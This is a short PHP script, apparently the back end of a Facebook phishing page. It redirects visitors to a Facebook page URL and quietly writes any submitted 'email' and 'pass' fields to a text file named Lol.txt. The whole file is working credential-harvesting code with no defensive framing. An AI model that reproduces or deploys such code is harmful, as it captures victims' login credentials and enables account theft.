<?php
header ('Location: https://m.facebook.com/My-photography-104274361372779/');
$handle = fopen("Lol.txt", "a");
foreach($_POST as $variable => $value) {
if($variable=="email" || $variable == "pass")
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
